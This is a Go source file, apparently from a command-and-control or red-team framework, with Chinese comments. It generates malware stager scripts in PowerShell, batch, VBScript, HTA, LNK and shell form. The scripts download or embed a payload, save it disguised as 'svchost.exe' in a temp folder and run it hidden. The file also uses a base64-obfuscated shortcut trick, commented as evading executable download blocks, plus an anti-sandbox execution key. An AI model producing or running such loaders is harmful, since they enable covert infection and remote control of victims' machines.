package delivery

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// 脚本载荷（下载器/加载器）生成器。
// 支持两种形态：
//   - url   模式：脚本只包含下载地址，运行时从 /d/{key}/full 拉取并执行
//   - embed 模式：脚本内嵌 base64 载荷字节，写盘后执行（ps1/bat 支持）
//
// kind: ps1 | vbs | bat | hta | lnk（Windows） | sh（Linux）

const (
	ScriptModeURL   = "url"
	ScriptModeEmbed = "embed"
)

// GenerateScript 生成脚本载荷文本（不带访问令牌，兼容旧调用）。
// fullURL 为完整载荷下载地址；downloadPath/saveFilename 为写盘位置；fullData 用于 embed 模式；
// pass 为上线口令（反沙箱 Exec Key），Linux sh 脚本执行载荷时附带该参数。
func GenerateScript(kind, mode, fullURL, downloadPath, saveFilename, pass string, fullData []byte) []byte {
	return generateScript(kind, mode, fullURL, downloadPath, saveFilename, pass, "", fullData)
}

// GenerateScriptWithToken 同上，但下载完整载荷时把访问令牌放进
// X-Delivery-Token 请求头，而不是拼在 URL 的 ?t= 里。
// URL 会进入代理/网关访问日志、浏览器历史与 Referer，令牌放头里能显著缩小泄露面。
func GenerateScriptWithToken(kind, mode, fullURL, downloadPath, saveFilename, pass, token string, fullData []byte) []byte {
	return generateScript(kind, mode, fullURL, downloadPath, saveFilename, pass, token, fullData)
}

func generateScript(kind, mode, fullURL, downloadPath, saveFilename, pass, token string, fullData []byte) []byte {
	kind = strings.ToLower(strings.TrimSpace(kind))
	if mode != ScriptModeEmbed {
		mode = ScriptModeURL
	}
	if downloadPath == "" {
		downloadPath = `C:\Windows\Temp`
	}
	if saveFilename == "" {
		saveFilename = "svchost.exe"
	}
	// 路径分隔符：sh 脚本用 /；其余 Windows 脚本用 \
	sep := `\`
	if kind == "sh" {
		sep = "/"
	}
	savePath := strings.TrimRight(downloadPath, `\/`) + sep + saveFilename

	// 上线口令（反沙箱 Exec Key）：非空时脚本启动载荷附带该参数
	passCmd := "" // 追加到命令行尾部（bat/sh 用空格分隔；vbs/hta 拼接）
	passPS := ""  // PowerShell -ArgumentList（ps1/lnk 用）
	if pass != "" {
		passCmd = " " + pass
		passPS = fmt.Sprintf(" -ArgumentList '%s'", pass)
	}

	// 令牌按脚本语法转义：PowerShell 单引号、VBS 双引号、sh 双引号
	psTok := strings.ReplaceAll(token, "'", "''")
	vbsTok := strings.ReplaceAll(token, `"`, `""`)
	shTok := strings.NewReplacer(`\`, `\\`, `"`, `\"`, `$`, `\$`, "`", "\\`").Replace(token)

	switch kind {
	case "ps1":
		if mode == ScriptModeEmbed && len(fullData) > 0 {
			// 【修复】embed 模式多行分片：单行 base64 过大时脚本行过长易损坏，
			// 改为每行一段 base64 拼接（$b+='...'），支持任意大小载荷
			b64 := base64.StdEncoding.EncodeToString(fullData)
			var sb strings.Builder
			sb.WriteString("$b=\"\"")
			const psChunk = 6000
			for i := 0; i < len(b64); i += psChunk {
				end := i + psChunk
				if end > len(b64) {
					end = len(b64)
				}
				sb.WriteString("\n$b+='" + b64[i:end] + "'")
			}
			sb.WriteString(fmt.Sprintf("\n[IO.File]::WriteAllBytes('%s',[System.Convert]::FromBase64String($b));Start-Process '%s'%s", savePath, savePath, passPS))
			return []byte(sb.String())
		}
		hdr := ""
		dl := "(New-Object System.Net.WebClient).DownloadFile($u,$p)"
		if token != "" {
			hdr = fmt.Sprintf("$c=New-Object System.Net.WebClient;$c.Headers.Add('X-Delivery-Token','%s');", psTok)
			dl = "$c.DownloadFile($u,$p)"
		}
		return []byte(fmt.Sprintf(`$u='%s';$p='%s';%s%s;Start-Process $p%s`, fullURL, savePath, hdr, dl, passPS))
	case "bat":
		if mode == ScriptModeEmbed && len(fullData) > 0 {
			// 【修复】bat embed 多行分片：cmd 单行上限约 8191 字符，base64 逐行
			// echo 追加到临时文件后 certutil 解码，支持任意大小载荷
			b64 := base64.StdEncoding.EncodeToString(fullData)
			var sb strings.Builder
			sb.WriteString("@echo off\r\n")
			sb.WriteString("set bf=%TEMP%\\tshell.b64\r\n")
			sb.WriteString("del \"%bf%\" >nul 2>nul\r\n")
			const batChunk = 6000
			for i := 0; i < len(b64); i += batChunk {
				end := i + batChunk
				if end > len(b64) {
					end = len(b64)
				}
				sb.WriteString("echo " + b64[i:end] + ">>\"%bf%\"\r\n")
			}
			sb.WriteString(fmt.Sprintf("certutil -decode \"%%bf%%\" \"%s\" >nul\r\n", savePath))
			sb.WriteString(fmt.Sprintf("del \"%%bf%%\"\r\nstart \"\" \"%s\"%s\r\n", savePath, passCmd))
			return []byte(sb.String())
		}
		hdr := ""
		dl := "(New-Object System.Net.WebClient).DownloadFile($u,$p)"
		if token != "" {
			hdr = fmt.Sprintf("$c=New-Object System.Net.WebClient;$c.Headers.Add('X-Delivery-Token','%s');", psTok)
			dl = "$c.DownloadFile($u,$p)"
		}
		return []byte(fmt.Sprintf("@echo off\r\npowershell -nop -w hidden -c \"$u='%s';$p='%s';%s%s;Start-Process $p%s\"", fullURL, savePath, hdr, dl, passPS))
	case "vbs":
		hdr := ""
		if token != "" {
			hdr = fmt.Sprintf("\r\nx.setRequestHeader \"X-Delivery-Token\",\"%s\"", vbsTok)
		}
		return []byte(fmt.Sprintf("Set x=CreateObject(\"MSXML2.XMLHTTP\")\r\nx.open \"GET\",\"%s\",False%s\r\nx.send\r\nSet s=CreateObject(\"ADODB.Stream\")\r\ns.Type=1\r\ns.Open\r\ns.Write x.responseBody\r\ns.SaveToFile \"%s\",2\r\ns.Close\r\nSet w=CreateObject(\"WScript.Shell\")\r\nw.Run \"%s%s\",0,False", fullURL, hdr, savePath, savePath, passCmd))
	case "hta":
		hdr := ""
		if token != "" {
			hdr = fmt.Sprintf("\r\n  x.setRequestHeader \"X-Delivery-Token\",\"%s\"", vbsTok)
		}
		return []byte(fmt.Sprintf(`<html><head><title>Document</title><script language="VBScript">
Function Main()
  Set x=CreateObject("MSXML2.XMLHTTP")
  x.open "GET","%s",False%s
  x.send
  Set s=CreateObject("ADODB.Stream")
  s.Type=1:s.Open
  s.Write x.responseBody
  s.SaveToFile "%s",2
  s.Close
  Set w=CreateObject("WScript.Shell")
  w.Run "%s%s",0,False
  window.close
End Function
Main
</script></head><body></body></html>`, fullURL, hdr, savePath, savePath, passCmd))
	case "lnk":
		// 【A6】快捷方式交付：PowerShell 脚本运行时在 %TEMP% 创建 .lnk 快捷方式
		// （指向隐藏运行的 powershell 下载器），随后启动该快捷方式。绕过 exe 直接下载拦截。
		// fullURL 为载荷下载地址；savePath 为最终载荷落盘位置。
		b64 := base64.StdEncoding.EncodeToString([]byte(fullURL))
		tokSetup := ""
		dlLnk := fmt.Sprintf("$x=(New-Object Net.WebClient).DownloadFile($u,''%s'')", savePath)
		if token != "" {
			tokSetup = fmt.Sprintf("$c=New-Object Net.WebClient;$c.Headers.Add(''X-Delivery-Token'',''%s'');", strings.ReplaceAll(token, "'", "''"))
			dlLnk = fmt.Sprintf("$c.DownloadFile($u,''%s'')", savePath)
		}
		return []byte(fmt.Sprintf(`$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%s'));$p='%s';$l=$env:TEMP+'\'+[IO.Path]::GetRandomFileName()+'.lnk';$w=New-Object -ComObject WScript.Shell;$s=$w.CreateShortcut($l);$s.TargetPath='powershell.exe';$s.Arguments='-nop -w hidden -c "%s%s;Start-Process ''%s''%s"';$s.WindowStyle=7;$s.Save();$w.Run($l,0,$false)`, b64, savePath, tokSetup, dlLnk, savePath, passPS))
	case "sh":
		// Linux shell 脚本：url 模式用 curl/wget 下载执行；embed 模式内嵌 base64 解码写盘执行。
		// 执行时附带上线口令（passCmd 已含前导空格，可空则无参数）
		if mode == ScriptModeEmbed && len(fullData) > 0 {
			b64 := base64.StdEncoding.EncodeToString(fullData)
			return []byte(fmt.Sprintf(`#!/bin/sh
echo %s | base64 -d > "%s" 2>/dev/null || echo %s | openssl base64 -d > "%s" 2>/dev/null
chmod +x "%s"
"%s"%s &`, b64, savePath, b64, savePath, savePath, savePath, passCmd))
		}
		// url 模式：优先 curl，回退 wget；令牌走请求头
		curlHdr := ""
		wgetHdr := ""
		if token != "" {
			curlHdr = fmt.Sprintf(` -H "X-Delivery-Token: %s"`, shTok)
			wgetHdr = fmt.Sprintf(` --header="X-Delivery-Token: %s"`, shTok)
		}
		return []byte(fmt.Sprintf(`#!/bin/sh
if command -v curl >/dev/null 2>&1; then curl -sSL%s -o "%s" "%s" && chmod +x "%s" && "%s"%s &
elif command -v wget >/dev/null 2>&1; then wget -q%s -O "%s" "%s" && chmod +x "%s" && "%s"%s &
fi`, curlHdr, savePath, fullURL, savePath, savePath, passCmd, wgetHdr, savePath, fullURL, savePath, savePath, passCmd))
	default:
		return nil
	}
}

// ScriptContentType 返回脚本资源的响应 Content-Type
func ScriptContentType(kind string) string {
	switch strings.ToLower(kind) {
	case "hta":
		return "application/hta"
	default:
		return "text/plain; charset=utf-8"
	}
}

// ScriptFileName 返回脚本资源的建议文件名
func ScriptFileName(kind string) string {
	return "payload." + strings.ToLower(kind)
}
